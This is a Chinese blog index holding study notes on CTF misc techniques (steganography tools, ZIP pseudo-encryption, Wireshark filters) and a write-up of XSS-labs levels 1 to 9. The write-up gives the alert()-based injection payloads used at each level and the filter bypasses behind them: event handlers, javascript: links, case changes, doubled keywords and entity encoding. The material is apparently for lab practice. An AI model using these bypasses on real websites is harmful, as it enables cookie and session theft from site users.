title="三、盲水印"></a>三、盲水印</h2><p>盲水印是利用二维傅里叶变换，给文件添加肉眼无法直接看到的水印数据。</p><p>盲水印不仅仅用于图片，也可应用于像音频这种数据流</p><p><strong>当出现两张看起来一模一样的图片，可以用盲水印解密工具来尝试。</strong></p><h3 id="BlindWaterMark工具"><a href="#BlindWaterMark工具" class="headerlink" title="BlindWaterMark工具"></a>BlindWaterMark工具</h3><p>工具下载<a href="https://github.com/chishaxie/BlindWaterMark">传送门</a></p><p><strong>合成盲水印：</strong>python3 bwmforpy3.py encode 原图 信息文件 盲水印图片</p><p><strong>提取盲水印：</strong>python3 bwmforpy3.py decode 原图 盲水印图片 信息文件</p><p>详细操作教程<a href="https://hetian.blog.csdn.net/article/details/122572238?spm=1001.2101.3001.6650.15&utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-15-122572238-blog-82847756.pc_relevant_multi_platform_whitelistv1&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-15-122572238-blog-82847756.pc_relevant_multi_platform_whitelistv1&utm_relevant_index=18">传送门</a></p><h2 id="四、音频隐写"><a href="#四、音频隐写" class="headerlink" title="四、音频隐写"></a>四、音频隐写</h2><p>详细可以参考此文章<a href="https://blog.csdn.net/qq_51652400/article/details/123504708">传送门</a></p><h3 id="推荐工具"><a href="#推荐工具" class="headerlink" title="推荐工具"></a>推荐工具</h3><p><strong>MP3stego</strong></p><p>工具下载<a href="https://www.petitcolas.net/steganography/mp3stego">传送门</a></p><p><strong>加密：</strong> encode -E 加密的txt文件名 -P pass 加密的wav文件名 输出的mp3文件名</p><p><strong>解密：</strong>decode -X -P pass MP3文件名</p><h2 id="五、伪加密"><a href="#五、伪加密" class="headerlink" title="五、伪加密"></a>五、伪加密</h2><p>一个ZIP文件由三部分组成：</p><p>压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标准</p><ul><li><p><strong>无加密</strong>：压缩源文件数据区的全局加密应当为00 00，且压缩源文件目录区的全局方式位标记应当为00 00</p></li><li><p><strong>真加密：</strong>压缩源文件数据区的全局加密应当为09（或奇数） 00，且压缩源文件目录区的全局方式位标记应当为09（或奇数） 00</p></li><li><p><strong>伪加密：</strong>压缩源文件数据区的全局加密应当为00（或其他数） 00，且压缩源文件目录区的全局方式位标记应当为09（或奇数） 00</p></li></ul><h2 id="六、图片隐写"><a href="#六、图片隐写" class="headerlink" title="六、图片隐写"></a>六、图片隐写</h2><h3 id="常见的图片隐写方式："><a href="#常见的图片隐写方式：" class="headerlink" title="常见的图片隐写方式："></a>常见的图片隐写方式：</h3><p>摘自：<a href="https://zhuanlan.zhihu.com/p/467859047">传送门</a></p><p>1.修改数据（png图片用winhex或者是010工具打开后，可以看到第二行前四个数据是高，后四个数据是宽。一般需要修改这两组数据来获得完整的图片）</p><p>2.图片的属性，详细信息中含有flag或者是含有密码，可以通过解密工具进行解密。</p><p>3.图片中含有另一张图，这时最简单的方法是使用<a href="https://github.com/korczis/foremost">foremost</a>工具进行图片的分离</p><p>4.通过查看一个文件的文件头含有：<strong>data:image&#x2F;png;base64，这就属于png图片格式，</strong>真正的base64编码是前缀之后的那些数据，然后就可以利用base64转图片进行操作（base64比较常用，但还是具体问题具体分析）</p><p>5.修改文件的后缀名：如将txt文件修改为jpg文件或者是png文件；有些题目需要将所有的文件名修改为png或jpg文件名后缀，然后拼接成为一个完整的flag</p><p>……</p><h3 id="推荐工具："><a href="#推荐工具：" class="headerlink" title="推荐工具："></a>推荐工具：</h3><p><strong>OutGuess</strong></p><p>下载（kali）教程<a href="https://blog.csdn.net/m0_58199719/article/details/123692511">传送门</a></p><p><strong>隐藏文件：</strong>outguess -k 秘钥 -d 隐藏文件 原始图片 加密后的图片</p><p><strong>提取文件：</strong>outguess -k 秘钥 -r 加密后的图片 输出文件名</p><h2 id="七、流量分析"><a href="#七、流量分析" class="headerlink" title="七、流量分析"></a>七、流量分析</h2><h3 id="IP筛选"><a href="#IP筛选" class="headerlink" title="IP筛选"></a>IP筛选</h3><table><thead><tr><th>ip.src &#x3D;&#x3D; 地址</th><th>源ip筛选</th></tr></thead><tbody><tr><td>ip.dst &#x3D;&#x3D; 地址</td><td>目的ip筛选</td></tr><tr><td>ip.addr &#x3D;&#x3D; 地址</td><td>ip筛选</td></tr></tbody></table><h3 id="MAC地址筛选"><a href="#MAC地址筛选" class="headerlink" title="MAC地址筛选"></a>MAC地址筛选</h3><table><thead><tr><th>eth.dst &#x3D;&#x3D; A0:00:00:04:C5:84</th><th>目标mac地址筛选</th></tr></thead><tbody><tr><td>eth.addr</td><td>mac地址筛选</td></tr></tbody></table><h3 id="端口筛选"><a href="#端口筛选" class="headerlink" title="端口筛选"></a>端口筛选</h3><table><thead><tr><th>tcp.dstport &#x3D;&#x3D; 80</th><th>筛选tcp协议的目标端口为80的流量包</th></tr></thead><tbody><tr><td>tcp.srcport &#x3D;&#x3D; 80</td><td>筛选tcp协议的源端口为80的流量包</td></tr><tr><td>udp.srcport &#x3D;&#x3D; 80</td><td>筛选udp协议的源端口为80的流量包</td></tr></tbody></table><h3 id="协议筛选"><a href="#协议筛选" class="headerlink" title="协议筛选"></a>协议筛选</h3><table><thead><tr><th>tcp</th><th>筛选协议为tcp的流量包</th></tr></thead><tbody><tr><td>udp</td><td>筛选协议为udp的流量包</td></tr><tr><td>arp&#x2F;icmp&#x2F;http&#x2F;ftp&#x2F;dns&#x2F;ip</td><td>筛选协议为arp&#x2F;icmp&#x2F;http&#x2F;ftp&#x2F;dns&#x2F;ip的流量包</td></tr></tbody></table><p><strong>注：可用！加协议名或者not加协议名表示排除该协议</strong></p><h3 id="流量包的修复"><a href="#流量包的修复" class="headerlink" title="流量包的修复"></a>流量包的修复</h3><p>通过在线pacp包修复工具进行修复 <a href="http://f00l.de/hacking/pcapfix.php">传送门</a></p><p><strong>才疏学浅、粗略总结，如有不足和错误，还望各位大师傅们帮忙指正:)！！！</strong></p>]]></content>
    
    
    <categories>
      
      <category>学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XSS-labs靶场练题记录</title>
    <link href="/2022/06/27/xss/"/>
    <url>/2022/06/27/xss/</url>
    
    <content type="html"><![CDATA[<h1 id="XSS靶场练题记录"><a href="#XSS靶场练题记录" class="headerlink" title="XSS靶场练题记录"></a>XSS靶场练题记录</h1><h2 id="XSS攻击："><a href="#XSS攻击：" class="headerlink" title="XSS攻击："></a><strong>XSS攻击：</strong></h2><p>XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java、 VBScript、ActiveX、 Flash 或者甚至是普通的HTML。攻击成功后，攻击者可能得到包括但不限于更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容</p><h2 id="XSS靶场地址："><a href="#XSS靶场地址：" class="headerlink" title="XSS靶场地址："></a><strong>XSS靶场地址：</strong></h2><p><a href="">传送门</a></p><h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2><p><a href="https://blog.csdn.net/qq_58784379/article/details/119564213">传送门</a></p><h2 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a><strong>解题过程</strong>：</h2><h3 id="Level1"><a href="#Level1" class="headerlink" title="Level1"></a>Level1</h3><p>右键获得源码，对源码进行分析可知，当<a href="https://www.runoob.com/jsref/met-win-alert.html">弹窗alert</a>被执行后，则输出”完成的不错！”并跳转到Level2。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-comment">&lt;!--STATUS OK--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;content-type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="language-javascript">&#123;     </span><br><span class="language-javascript"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);</span><br><span class="language-javascript"> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;level2.php?keyword=test&quot;</span>; </span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>欢迎来到level1<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level1<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎用户test<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">level1.png</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>payload的长度:4<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br>﻿<br></code></pre></td></tr></table></figure><h3 id="Level2"><a href="#Level2" class="headerlink" title="Level2"></a>Level2</h3><p>构建alert()提交后发现没有弹窗，右键查看源码发现&lt;&gt;被过滤。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>没有找到和<span class="hljs-symbol">&amp;lt;</span>script<span class="hljs-symbol">&amp;gt;</span>alert()<span class="hljs-symbol">&amp;lt;</span>/script<span class="hljs-symbol">&amp;gt;</span>相关的结果.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br></code></pre></td></tr></table></figure><p>但在value处未被过滤，所以闭合value标签，再执行。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;input <span class="hljs-attribute">name</span>=keyword  <span class="hljs-attribute">value</span>=<span class="hljs-string">&quot;&lt;script&gt;alert()&lt;/script&gt;&quot;</span>&gt;<br></code></pre></td></tr></table></figure><h3 id="Level3"><a href="#Level3" class="headerlink" title="Level3"></a>Level3</h3><p>构建alert()提交后发现没有弹窗，右键查看源码发现value处的&lt;&gt;也被过滤。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level3<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>没有找到和<span class="hljs-symbol">&amp;lt;</span>script<span class="hljs-symbol">&amp;gt;</span>alert()<span class="hljs-symbol">&amp;lt;</span>/script<span class="hljs-symbol">&amp;gt;</span>相关的结果.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">level3.php</span> <span class="hljs-attr">method</span>=<span class="hljs-string">GET</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">keyword</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&#x27;<span class="hljs-symbol">&amp;lt;</span>script<span class="hljs-symbol">&amp;gt;</span>alert()<span class="hljs-symbol">&amp;lt;</span>/script<span class="hljs-symbol">&amp;gt;</span>&#x27;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">name</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">value</span>=<span class="hljs-string">搜索</span> /&gt;</span><br></code></pre></td></tr></table></figure><p>于是构造<a href="https://www.runoob.com/jsref/event-onclick.html">事件</a>，此处构造代码为：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&#x27; onclick=alert() &#x27;<br></code></pre></td></tr></table></figure><p>提交后点击输入框则弹出弹窗。</p><p>PS：经王师傅提示，使用onmouseover构造更加方便。</p><h3 id="Level4"><a href="#Level4" class="headerlink" title="Level4"></a>Level4</h3><p>构造提交后右键查看源代码发现依旧是&lt;&gt;被过滤。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level4<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>没有找到和<span class="hljs-symbol">&amp;lt;</span>script<span class="hljs-symbol">&amp;gt;</span>alert()<span class="hljs-symbol">&amp;lt;</span>/script<span class="hljs-symbol">&amp;gt;</span>相关的结果.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">level4.php</span> <span class="hljs-attr">method</span>=<span class="hljs-string">GET</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">keyword</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;scriptalert()/script&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">name</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">value</span>=<span class="hljs-string">搜索</span> /&gt;</span><br></code></pre></td></tr></table></figure><p>模仿Level3构建事件，点击输入框弹出弹窗。</p><h3 id="Level5"><a href="#Level5" class="headerlink" title="Level5"></a>Level5</h3><p>尝试构造后发现，题目直接在我的<script>中添加下划线进行过滤。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level5<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>没有找到和<span class="hljs-symbol">&amp;lt;</span>script<span class="hljs-symbol">&amp;gt;</span>alert()<span class="hljs-symbol">&amp;lt;</span>/script<span class="hljs-symbol">&amp;gt;</span>相关的结果.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">level5.php</span> <span class="hljs-attr">method</span>=<span class="hljs-string">GET</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">keyword</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&lt;scr_ipt&gt;alert()&lt;/script&gt;&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">name</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">value</span>=<span class="hljs-string">搜索</span> /&gt;</span><br></code></pre></td></tr></table></figure><p>同时构造事件也被同样的方式过滤，最后构造javascript语句弹出成功。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&quot; /&gt; <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">javascript:alert()</span>&gt;</span><br></code></pre></td></tr></table></figure><p>PS： " />是确保前面的内容闭合。</p><h3 id="Level6"><a href="#Level6" class="headerlink" title="Level6"></a>Level6</h3><p>尝试Level5中的方法失败了，查看源代码发现herf被过滤了。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level6<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>没有找到和<span class="hljs-symbol">&amp;quot;</span> /<span class="hljs-symbol">&amp;gt;</span> <span class="hljs-symbol">&amp;lt;</span>a href=javascript:alert()<span class="hljs-symbol">&amp;gt;</span>相关的结果.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">level6.php</span> <span class="hljs-attr">method</span>=<span class="hljs-string">GET</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">keyword</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> /&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">hr_ef</span>=<span class="hljs-string">javascript:alert()</span>&gt;</span>&quot;&gt;<br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">name</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">value</span>=<span class="hljs-string">搜索</span> /&gt;</span><br></code></pre></td></tr></table></figure><p>于是构造大写来绕过。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&quot; /&gt; <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">hrEf</span>=<span class="hljs-string">javascript:alert()</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="Level7："><a href="#Level7：" class="headerlink" title="Level7："></a>Level7：</h3><p>构造后发现直接将<>内的script给删除了，大小写无法规避。</p><p>尝试双写script后成功。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">scrscriptipt</span>&gt;</span>alert()<span class="hljs-tag">&lt;/<span class="hljs-name">scrscriptipt</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="Level8"><a href="#Level8" class="headerlink" title="Level8"></a>Level8</h3><p>当我们输入内容的时候，value的内容会直接带入href，点击友情链接的时候，就会执行带入的参数。</p><p>尝试使用javascript:alert()发现存在过滤。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">level8.php</span> <span class="hljs-attr">method</span>=<span class="hljs-string">GET</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">keyword</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;javascript:alert()&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">name</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">value</span>=<span class="hljs-string">添加友情链接</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">BR</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javascr_ipt:alert()&quot;</span>&gt;</span>友情链接<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">level8.jpg</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>payload的长度:19<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这里对script进行HTML实体编码。</p><p><a href="https://www.qqxiuzi.cn/bianma/zifushiti.php">HTML实体编码在线转换</a></p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">java&amp;<span class="hljs-attr">#115</span>;&amp;<span class="hljs-attr">#99</span>;&amp;<span class="hljs-attr">#114</span>;&amp;<span class="hljs-attr">#105</span>;&amp;<span class="hljs-attr">#112</span>;&amp;<span class="hljs-attr">#116</span>;:alert<span class="hljs-comment">()</span><br></code></pre></td></tr></table></figure><h3 id="Level9"><a href="#Level9" class="headerlink" title="Level9"></a>Level9</h3><p>输入提示内容非法，判断其对协议进行检测。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">level9.php</span> <span class="hljs-attr">method</span>=<span class="hljs-string">GET</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">keyword</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;java<span class="hljs-symbol">&amp;amp;</span>#115;<span class="hljs-symbol">&amp;amp;</span>#99;<span class="hljs-symbol">&amp;amp;</span>#114;<span class="hljs-symbol">&amp;amp;</span>#105;<span class="hljs-symbol">&amp;amp;</span>#112;<span class="hljs-symbol">&amp;amp;</span>#116;:alert()&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">name</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">value</span>=<span class="hljs-string">添加友情链接</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">BR</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;您的链接不合法？有没有！&quot;</span>&gt;</span>友情链接<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">level9.png</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>payload的长度:47<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></td></tr></table></figure><p>声明http://协议，同时对其进行注释，使其能够通过检测同时不影响javascript:alert()的执行。</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">java&amp;<span class="hljs-attr">#115</span>;&amp;<span class="hljs-attr">#99</span>;&amp;<span class="hljs-attr">#114</span>;&amp;<span class="hljs-attr">#105</span>;&amp;<span class="hljs-attr">#112</span>;&amp;<span class="hljs-attr">#116</span>;:alert<span class="hljs-comment">()</span><span class="hljs-comment">//http://</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>XSS</tag>
      
      <tag>XSSlabs</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
